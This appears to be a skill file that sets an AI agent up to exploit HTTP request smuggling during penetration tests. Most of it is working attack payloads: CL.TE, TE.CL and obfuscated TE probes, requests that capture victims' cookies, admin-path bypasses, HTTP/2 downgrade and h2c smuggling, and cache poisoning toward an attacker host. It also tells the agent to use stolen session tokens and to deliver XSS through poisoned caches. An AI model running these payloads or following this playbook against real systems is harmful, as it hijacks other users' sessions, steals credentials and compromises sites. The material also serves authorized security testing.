---
name: request-smuggling
description: >
  Guide HTTP request smuggling exploitation during authorized penetration
  testing.
keywords:
  - request smuggling
  - HTTP desync
  - CL.TE
  - TE.CL
  - H2 smuggling
  - h2c smuggling
  - transfer-encoding chunked
  - content-length desync
  - HTTP/2 downgrade
  - response desync
  - connection state attack
  - hop-by-hop
  - HTTP pipeline
  - websocket smuggling
tools:
  - burpsuite (HTTP Request Smuggler extension)
  - smuggler.py
  - smuggleFuzz
  - h2csmuggler
opsec: medium
---

# HTTP Request Smuggling

You are helping a penetration tester exploit HTTP request smuggling
vulnerabilities. The target has a front-end server (reverse proxy, CDN, load
balancer) and a back-end server that disagree on where one HTTP request ends
and the next begins. The goal is to desynchronize the request pipeline to
hijack other users' requests, bypass access controls, or poison caches.
All testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[request-smuggling] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Target behind a reverse proxy, CDN, or load balancer (multi-tier architecture)
- Burp Suite with HTTP Request Smuggler extension (or manual testing)
- HTTP connection reuse enabled on the front-end (keep-alive / HTTP/2)
- `smuggler.py` (`pip install smuggler`) or smuggleFuzz for automated scanning

## Step 1: Assess

If not already provided, determine:
1. **Architecture** — identify front-end (CDN, WAF, reverse proxy) and back-end
   - Check `Server`, `Via`, `X-Powered-By`, `X-Cache` headers
   - Known stacks: Cloudflare→Nginx, AWS ALB→Apache, HAProxy→Node, Akamai→IIS
2. **HTTP version** — HTTP/1.1, HTTP/2, or mixed (front-end H2, back-end H1)
3. **Connection behavior** — does the front-end reuse back-end connections?
   - Send two requests on the same TCP connection with different paths
   - If both succeed without reconnecting, connection reuse is active
4. **Transfer-Encoding support** — does the target accept chunked encoding?

```bash
# Detect front-end/back-end via headers
curl -sI https://TARGET/ | grep -iE 'server|via|x-powered|x-cache|x-forwarded'

# Check HTTP/2 support
curl -sI --http2 https://TARGET/ -o /dev/null -w '%{http_version}\n'

# smuggler.py — automated detection
python3 -m smuggler -u https://TARGET/
```

## Step 2: Detect — CL.TE

The front-end uses Content-Length, the back-end uses Transfer-Encoding.

### Detection Probe

Send a request where CL includes the full body but TE terminates early.
If the back-end uses TE, it processes only the chunk and the remainder
poisons the next request in the pipeline.

```http
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

- **Front-end** reads 6 bytes (`0\r\n\r\nG`) per Content-Length, forwards all
- **Back-end** reads chunked: chunk size `0` = end, leaves `G` in buffer
- Next request from the pipeline starts with `G` → back-end returns 405 or
  "Unrecognized method GPOST"

**Confirmation**: If the second request (from you or another user on the same
connection) gets a 405 or unexpected error, CL.TE desync is confirmed.

### Timing-Based Detection

```http
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q

```

- If CL.TE: front-end reads 4 bytes, back-end reads TE and waits for final
  `0\r\n\r\n` (back-end hangs waiting for end of chunked body)

## Step 3: Detect — TE.CL

The front-end uses Transfer-Encoding, the back-end uses Content-Length.

### Detection Probe

```http
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

- **Front-end** reads chunked: chunk `8` bytes → `SMUGGLED`, then `0` → end
- **Back-end** reads CL=3 bytes (`8\r\n`), leaves `SMUGGLED\r\n0\r\n\r\n` in buffer

**Important**: In Burp Repeater, disable "Update Content-Length". The trailing
blank line after `0` must include `\r\n\r\n`.

### Timing-Based Detection

```http
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

- If TE.CL: front-end reads TE (ends at `0`), back-end reads CL=6 and waits
  for more data

## Step 4: Detect — TE.TE (Obfuscation)

Both servers support Transfer-Encoding, but one can be tricked into ignoring
it through header obfuscation. This degrades to either CL.TE or TE.CL.

### Obfuscation Variants

Try each — one may cause a server to fall back to Content-Length:

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
 Transfer-Encoding: chunked
X: X\nTransfer-Encoding: chunked
Transfer-Encoding
 : chunked
Transfer-Encoding: chunk
Transfer-Encoding: chunKed
```

Test each obfuscation with the CL.TE and TE.CL detection probes from
Steps 2-3. When one pair triggers a desync, you've identified which server
ignores the obfuscated TE header.

## Step 5: Exploit — Request Hijacking

Once the desync type is confirmed, smuggle a partial request that captures
the next user's request.

### CL.TE — Capture Victim's Request

```http
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Content-Length: 200

```

The back-end sees chunk `0` (end), then `POST /log` as the next request.
The victim's next request body is appended to the smuggled request's body
(up to CL=200). If `/log` reflects input or stores it, the victim's
headers (including cookies and auth tokens) are captured.

### TE.CL — Capture Victim's Request

```http
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

71
POST /log HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

x=
0
```

Note: `71` is the hex length of the smuggled prefix (calculate exactly).
The back-end reads CL=4 (`71\r\n`), leaves the smuggled request in buffer.

### Access Control Bypass

Smuggle a request to an admin endpoint that the front-end blocks:

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: TARGET
X-Ignore: X
```

The front-end sees a POST to `/` (allowed). The back-end processes the
smuggled `GET /admin` as a separate request, bypassing front-end path
restrictions.

### Front-End Header Injection

If the front-end adds headers (X-Forwarded-For, X-Real-IP), smuggled
requests bypass them — the back-end sees raw smuggled headers. Use this to:
- Bypass IP-based allow lists (remove X-Forwarded-For)
- Impersonate internal users (add X-Internal-User: admin)
- Skip authentication that only the front-end enforces

## Step 6: HTTP/2 Downgrade Smuggling

When the front-end speaks HTTP/2 but downgrades to HTTP/1.1 for the back-end.

### H2.CL — Frame Length vs Content-Length

HTTP/2 uses frame length for body size. If the front-end trusts frame length
but the back-end trusts Content-Length after downgrade:

```
:method: POST
:path: /
:authority: TARGET
content-length: 0

GET /admin HTTP/1.1
Host: TARGET

```

The HTTP/2 frame contains the full body (including `GET /admin`). Front-end
forwards it all. Back-end reads CL=0, treats the rest as the next request.

### H2.TE — Frame Length vs Transfer-Encoding

```
:method: POST
:path: /
:authority: TARGET
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: TARGET

```

Front-end reads the full H2 frame. Back-end reads chunked, hits `0` (end),
treats `GET /admin` as a new request.

### HTTP/2 CRLF Injection

HTTP/2 pseudo-headers don't normally contain CRLF. But if the front-end
doesn't validate and the back-end receives HTTP/1.1:

```
:method: POST
:path: / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET
```

The injected CRLF creates a complete smuggled request after downgrade.

### H2C Smuggling (Clear-Text Upgrade)

If the front-end forwards `Upgrade: h2c` to the back-end:

```http
GET / HTTP/1.1
Host: TARGET
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
```

If the back-end responds `101 Switching Protocols`, the connection upgrades
to raw HTTP/2 — bypassing all front-end request inspection for subsequent
requests.

```bash
# h2csmuggler — automated h2c upgrade attack
# BishopFox version:
python3 h2csmuggler.py -x https://TARGET/ --test

# Assetnote version:
python3 h2csmuggler.py --scan-list urls.txt --threads 5
```

**Known vulnerable proxies**: HAProxy, Traefik, Nuster forward h2c by default.
AWS ALB, NGINX, Apache, Squid, Envoy may be misconfigured.

## Step 7: Advanced Techniques

### Response Desync (Queue Poisoning)

Instead of prefixing a victim's request, desynchronize the response queue
so a victim receives your response (or vice versa).

**HEAD method technique**: HEAD responses have Content-Length but no body.
Smuggle a HEAD followed by a malicious request:

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 52
Transfer-Encoding: chunked

0

HEAD /large-page HTTP/1.1
Host: TARGET

```

1. Back-end sends HEAD response (CL: 8000 but no body)
2. Proxy expects 8000 bytes of body, reads next response as body
3. Victim receives attacker's injected response content

### Web Cache Poisoning via Smuggling

If the front-end caches responses, smuggle a request that poisons the cache:

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 59
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: ATTACKER-SERVER

```

The cache associates the response from ATTACKER-SERVER with `/static/main.js`.
All subsequent users receive the poisoned resource.

### WebSocket Smuggling

If the front-end handles WebSocket upgrades:

```http
GET /chat HTTP/1.1
Host: TARGET
Sec-WebSocket-Version: 1337
Upgrade: websocket
Connection: Upgrade
```

Some proxies (Varnish, older Envoy) see the Upgrade header and assume
WebSocket is established without validating the back-end response. If the
back-end returns 426 (wrong version) but the proxy ignores it, the
connection stays open — providing unrestricted access to internal APIs.

### Connection State Attacks

**First-request routing**: Some proxies validate Host/authority only on the
first request per connection. Send a benign first request, then smuggle to
internal hosts:

```
Request 1: GET / HTTP/1.1   Host: public.example.com   (passes validation)
Request 2: GET /admin HTTP/1.1   Host: internal.example.com   (reuses connection)
```

**HTTP/2 connection coalescing**: Browsers reuse HTTP/2 connections when
certificate, ALPN, and IP match. If attacker controls `evil.com` on the
same CDN node as `internal.company`:

1. Victim connects to `evil.com` (attacker page)
2. `evil.com` embeds `<img src="https://internal.company/secret">`
3. Browser reuses the existing HTTP/2 connection (same cert/IP)
4. CDN routes to internal host without re-validating authority

### Hop-by-Hop Header Abuse

Trick proxies into stripping security-relevant headers by declaring them
hop-by-hop:

```http
GET / HTTP/1.1
Host: TARGET
X-Forwarded-For: 127.0.0.1
Connection: close, X-Forwarded-For
```

If the proxy strips `X-Forwarded-For` as hop-by-hop, the back-end may see
the request as coming from the proxy's IP instead of the client's —
bypassing IP-based access controls.

## Step 8: Escalate or Pivot

After confirming smuggling:
- **Captured auth tokens**: Use stolen session cookies/tokens to access victim
  accounts. Route to further testing with those credentials.
- **Bypassed access controls**: Access admin panels, internal APIs. Route to
  **command-injection** or application-specific exploitation.
- **Poisoned cache**: Deliver XSS to all users via cached malicious response.
  Escalate for payload development.
- **Internal host access**: Via h2c or connection state attack. Route to
  **ssrf** techniques for further internal network exploration.
- **Found CRLF injection**: Escalate for header injection
  to XSS escalation.

Report in your return summary: any new credentials, access, vulns, or pivot paths discovered.

When routing, pass along: confirmed desync type (CL.TE/TE.CL/H2), working
payload, and front-end/back-end stack identified.

## OPSEC Notes

- Smuggled requests appear in back-end logs as normal requests — attribution
  is difficult but not impossible
- Detection probes (Steps 2-4) send malformed requests that may trigger WAF
  alerts or error spikes
- Capturing other users' requests is **destructive** to their sessions — use
  test accounts in controlled environments when possible
- Cache poisoning affects all users — confirm scope allows this before testing
- H2C smuggling creates a persistent bypass — clean up by closing connections
- Time-based detection is safer than active smuggling for initial confirmation

## Troubleshooting

### Detection Probes Show No Desync

- Confirm the target uses connection reuse (not connection: close per request)
- Try all TE obfuscation variants — different proxies are sensitive to
  different malformations
- Check if HTTP/2 is in use — classic CL/TE probes don't work, try H2
  techniques instead
- Some CDNs (Cloudflare, AWS CloudFront) have been patched against basic
  smuggling — try TE.TE obfuscation or H2 downgrade vectors

### Smuggled Request Not Processed

- Verify chunk sizes are calculated correctly (hex, excluding CRLF)
- In Burp Repeater: disable "Update Content-Length", ensure `\r\n` line endings
- For TE.CL: the final `0\r\n\r\n` must be complete — a missing `\r\n` causes
  the back-end to wait indefinitely
- For CL.TE: Content-Length must account for the chunk terminator bytes

### H2 Smuggling Fails

- Confirm the back-end actually receives HTTP/1.1 (not end-to-end H2)
- Use Burp's HTTP/2 inspector to inject raw pseudo-headers with CRLF
- For h2c: the back-end must support HTTP/2 clear-text and the proxy must
  forward the Upgrade header — test with `h2csmuggler --test`

### Automated Scanning

```bash
# smuggler.py — test all CL/TE variants
python3 -m smuggler -u https://TARGET/

# smuggleFuzz — HTTP/2 and HTTP/3 brute-force
smugglefuzz -url https://TARGET/

# Burp: Extensions → HTTP Request Smuggler → right-click → "Smuggle probe"
# Enable HTTP/2 probing in extension options for H2 downgrade testing
```
